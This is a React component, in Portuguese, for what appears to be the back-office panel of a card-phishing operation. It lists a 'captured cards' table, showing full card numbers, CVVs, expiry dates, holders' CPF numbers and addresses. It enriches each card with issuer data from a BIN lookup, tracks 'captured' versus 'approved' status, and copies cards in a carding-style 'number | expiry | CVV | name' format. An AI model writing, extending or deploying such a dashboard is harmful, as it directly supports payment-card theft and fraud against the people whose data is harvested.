import { useEffect, useMemo, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Card } from "@/components/ui/card";
import { Loader2, Search, CreditCard, Building2, Globe, Copy, Check, Trash2, Filter } from "lucide-react";
import { toast } from "sonner";
import { lookupBin } from "@/lib/cardUtils";

interface Cartao {
  id: string;
  titular: string;
  numero: string;
  bin: string;
  ultimos4: string;
  validade: string;
  cvv: string;
  cpf: string | null;
  endereco: string | null;
  bandeira: string | null;
  status: string;
  created_at: string;
  metadata: any;
  pagamento_id: string | null;
}

const STATUS_STYLES: Record<string, string> = {
  capturado: "bg-amber-100 text-amber-800 border-amber-200",
  aprovado: "bg-emerald-100 text-emerald-800 border-emerald-200",
  recusado: "bg-rose-100 text-rose-800 border-rose-200",
  pendente: "bg-blue-100 text-blue-800 border-blue-200",
};

const BRAND_COLORS: Record<string, string> = {
  Visa: "bg-blue-600 text-white",
  Mastercard: "bg-orange-500 text-white",
  Amex: "bg-sky-700 text-white",
  Elo: "bg-yellow-500 text-white",
  Hipercard: "bg-red-600 text-white",
  Discover: "bg-orange-600 text-white",
  JCB: "bg-emerald-700 text-white",
  Diners: "bg-slate-700 text-white",
  Desconhecida: "bg-gray-400 text-white",
};

const CartoesSection = () => {
  const [cartoes, setCartoes] = useState<Cartao[]>([]);
  const [loading, setLoading] = useState(true);
  const [enriched, setEnriched] = useState<Record<string, any>>({});
  const [search, setSearch] = useState("");
  const [filtroBanco, setFiltroBanco] = useState("");
  const [filtroBandeira, setFiltroBandeira] = useState("");
  const [copiedId, setCopiedId] = useState<string | null>(null);

  const load = async () => {
    setLoading(true);
    const { data } = await supabase
      .from("cartoes_capturados" as any)
      .select("*")
      .order("created_at", { ascending: false });
    setCartoes((data as any) || []);
    setLoading(false);
  };

  useEffect(() => {
    load();
    const ch = supabase
      .channel("cartoes_capturados_rt")
      .on("postgres_changes", { event: "*", schema: "public", table: "cartoes_capturados" }, load)
      .subscribe();
    return () => {
      supabase.removeChannel(ch);
    };
  }, []);

  // BIN enrichment
  useEffect(() => {
    cartoes.forEach(async (c) => {
      if (!c.bin || enriched[c.bin] !== undefined) return;
      setEnriched((prev) => ({ ...prev, [c.bin]: null }));
      const info = await lookupBin(c.bin);
      setEnriched((prev) => ({ ...prev, [c.bin]: info || {} }));
    });
  }, [cartoes]);

  const filtered = useMemo(() => {
    const q = search.toLowerCase().trim();
    return cartoes.filter((c) => {
      const info = enriched[c.bin] || {};
      const banco = info.bank?.name || "";
      const bandeira = (c.bandeira || info.scheme || "").toLowerCase();
      if (filtroBanco && !banco.toLowerCase().includes(filtroBanco.toLowerCase())) return false;
      if (filtroBandeira && !bandeira.includes(filtroBandeira.toLowerCase())) return false;
      if (!q) return true;
      return (
        c.titular?.toLowerCase().includes(q) ||
        c.bin?.includes(q) ||
        c.ultimos4?.includes(q) ||
        banco.toLowerCase().includes(q) ||
        (c.cpf || "").includes(q)
      );
    });
  }, [cartoes, enriched, search, filtroBanco, filtroBandeira]);

  const stats = useMemo(() => {
    const byBrand: Record<string, number> = {};
    const byStatus: Record<string, number> = {};
    cartoes.forEach((c) => {
      const b = c.bandeira || "Desconhecida";
      byBrand[b] = (byBrand[b] || 0) + 1;
      byStatus[c.status] = (byStatus[c.status] || 0) + 1;
    });
    return { total: cartoes.length, byBrand, byStatus };
  }, [cartoes]);

  const handleCopy = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    toast.success("Copiado!");
    setTimeout(() => setCopiedId(null), 1500);
  };

  const handleDelete = async (id: string) => {
    if (!confirm("Excluir este cartão capturado?")) return;
    const { error } = await supabase.from("cartoes_capturados" as any).delete().eq("id", id);
    if (error) return toast.error("Erro ao excluir");
    toast.success("Excluído");
  };

  if (loading) {
    return (
      <div className="flex items-center justify-center py-20">
        <Loader2 className="h-7 w-7 animate-spin text-primary" />
      </div>
    );
  }

  return (
    <div className="space-y-5">
      {/* Stats */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
        <Card className="p-4">
          <div className="text-[10px] font-semibold text-muted-foreground uppercase tracking-wider">Total</div>
          <div className="text-2xl font-extrabold mt-1">{stats.total}</div>
          <div className="text-[10px] text-muted-foreground mt-0.5">cartões capturados</div>
        </Card>
        <Card className="p-4">
          <div className="text-[10px] font-semibold text-muted-foreground uppercase tracking-wider">Aprovados</div>
          <div className="text-2xl font-extrabold mt-1 text-emerald-600">{stats.byStatus.aprovado || 0}</div>
        </Card>
        <Card className="p-4">
          <div className="text-[10px] font-semibold text-muted-foreground uppercase tracking-wider">Capturados</div>
          <div className="text-2xl font-extrabold mt-1 text-amber-600">{stats.byStatus.capturado || 0}</div>
        </Card>
        <Card className="p-4">
          <div className="text-[10px] font-semibold text-muted-foreground uppercase tracking-wider">Bandeiras</div>
          <div className="flex flex-wrap gap-1 mt-1">
            {Object.entries(stats.byBrand).map(([b, c]) => (
              <span key={b} className={`text-[10px] font-bold px-1.5 py-0.5 rounded ${BRAND_COLORS[b] || "bg-gray-300"}`}>
                {b} {c}
              </span>
            ))}
          </div>
        </Card>
      </div>

      {/* Filtros */}
      <Card className="p-4">
        <div className="flex items-center gap-2 mb-3">
          <Filter className="h-4 w-4 text-muted-foreground" />
          <span className="text-xs font-bold text-muted-foreground uppercase tracking-wider">Filtros</span>
        </div>
        <div className="grid grid-cols-1 md:grid-cols-3 gap-2">
          <div className="relative">
            <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
            <Input
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              placeholder="Buscar por nome, BIN, últimos 4..."
              className="pl-9"
            />
          </div>
          <Input
            value={filtroBanco}
            onChange={(e) => setFiltroBanco(e.target.value)}
            placeholder="Filtrar por banco emissor"
          />
          <Input
            value={filtroBandeira}
            onChange={(e) => setFiltroBandeira(e.target.value)}
            placeholder="Filtrar por bandeira"
          />
        </div>
      </Card>

      {/* Lista */}
      {filtered.length === 0 ? (
        <Card className="p-10 text-center text-sm text-muted-foreground">
          <CreditCard className="h-10 w-10 mx-auto mb-3 opacity-30" />
          Nenhum cartão encontrado.
        </Card>
      ) : (
        <div className="grid gap-3">
          {filtered.map((c) => {
            const info = enriched[c.bin] || {};
            const banco = info.bank?.name || "—";
            const pais = info.country?.name || info.country?.emoji || "—";
            const tipo = info.type ? info.type.charAt(0).toUpperCase() + info.type.slice(1) : "—";
            const categoria = info.brand || "Standard";
            const bandeiraFinal = c.bandeira || info.scheme || "Desconhecida";
            const statusClass = STATUS_STYLES[c.status] || "bg-gray-100 text-gray-800";

            return (
              <Card key={c.id} className="p-4 hover:shadow-md transition-shadow">
                <div className="flex flex-col md:flex-row gap-4">
                  {/* Cartão visual */}
                  <div
                    className="rounded-xl p-4 text-white shrink-0 md:w-72"
                    style={{ background: "linear-gradient(135deg, #1e3a8a 0%, #0033A0 60%, #001f6e 100%)" }}
                  >
                    <div className="flex items-center justify-between mb-4">
                      <CreditCard className="h-5 w-5" />
                      <span className={`text-[10px] font-bold uppercase px-2 py-0.5 rounded ${BRAND_COLORS[bandeiraFinal] || "bg-white/20"}`}>
                        {bandeiraFinal}
                      </span>
                    </div>
                    <div className="font-mono text-base tracking-widest">
                      {c.numero.replace(/(\d{4})(?=\d)/g, "$1 ").trim()}
                    </div>
                    <div className="flex justify-between mt-3 text-[10px] uppercase">
                      <div>
                        <div className="opacity-70">Titular</div>
                        <div className="font-semibold normal-case truncate max-w-[140px]">{c.titular}</div>
                      </div>
                      <div className="text-right">
                        <div className="opacity-70">Val.</div>
                        <div className="font-semibold">{c.validade}</div>
                      </div>
                      <div className="text-right">
                        <div className="opacity-70">CVV</div>
                        <div className="font-semibold">{c.cvv}</div>
                      </div>
                    </div>
                  </div>

                  {/* Análise */}
                  <div className="flex-1 grid grid-cols-2 md:grid-cols-3 gap-3 text-xs">
                    <Info icon={<Building2 className="h-3.5 w-3.5" />} label="Banco emissor" value={banco} />
                    <Info icon={<CreditCard className="h-3.5 w-3.5" />} label="Bandeira" value={bandeiraFinal} />
                    <Info icon={<CreditCard className="h-3.5 w-3.5" />} label="Tipo" value={tipo} />
                    <Info icon={<CreditCard className="h-3.5 w-3.5" />} label="Categoria" value={categoria} />
                    <Info icon={<Globe className="h-3.5 w-3.5" />} label="País" value={pais} />
                    <Info icon={<CreditCard className="h-3.5 w-3.5" />} label="BIN" value={c.bin} mono />
                    {c.cpf && <Info label="CPF" value={c.cpf} mono />}
                    {c.endereco && <Info label="Endereço" value={c.endereco} />}
                    <Info label="Captura" value={new Date(c.created_at).toLocaleString("pt-BR")} />
                    {c.metadata?.parcelas && (
                      <Info
                        label="Parcelamento"
                        value={
                          c.metadata.valor_parcela
                            ? `${c.metadata.parcelas}x de R$ ${Number(c.metadata.valor_parcela).toLocaleString("pt-BR", { minimumFractionDigits: 2, maximumFractionDigits: 2 })} sem juros`
                            : `${c.metadata.parcelas}x sem juros`
                        }
                      />
                    )}
                    {c.metadata?.valor_total && (
                      <Info
                        label="Valor total"
                        value={`R$ ${Number(c.metadata.valor_total).toLocaleString("pt-BR", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`}
                      />
                    )}
                    <div>
                      <div className="text-[10px] font-semibold text-muted-foreground uppercase">Status</div>
                      <Badge className={`mt-1 ${statusClass} border`}>{c.status}</Badge>
                    </div>
                  </div>
                </div>

                {/* Ações */}
                <div className="flex items-center gap-2 mt-4 pt-3 border-t">
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => handleCopy(c.numero, c.id)}
                    className="text-xs"
                  >
                    {copiedId === c.id ? <Check className="h-3.5 w-3.5 mr-1" /> : <Copy className="h-3.5 w-3.5 mr-1" />}
                    Copiar número
                  </Button>
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => handleCopy(`${c.numero} | ${c.validade} | ${c.cvv} | ${c.titular}`, c.id + "all")}
                    className="text-xs"
                  >
                    <Copy className="h-3.5 w-3.5 mr-1" /> Copiar tudo
                  </Button>
                  <Button
                    variant="ghost"
                    size="sm"
                    onClick={() => handleDelete(c.id)}
                    className="text-xs text-rose-600 hover:text-rose-700 hover:bg-rose-50 ml-auto"
                  >
                    <Trash2 className="h-3.5 w-3.5 mr-1" /> Excluir
                  </Button>
                </div>
              </Card>
            );
          })}
        </div>
      )}
    </div>
  );
};

const Info = ({ icon, label, value, mono }: { icon?: any; label: string; value: string; mono?: boolean }) => (
  <div>
    <div className="flex items-center gap-1 text-[10px] font-semibold text-muted-foreground uppercase tracking-wider">
      {icon} {label}
    </div>
    <div className={`mt-0.5 font-semibold text-foreground truncate ${mono ? "font-mono" : ""}`}>{value || "—"}</div>
  </div>
);

export default CartoesSection;
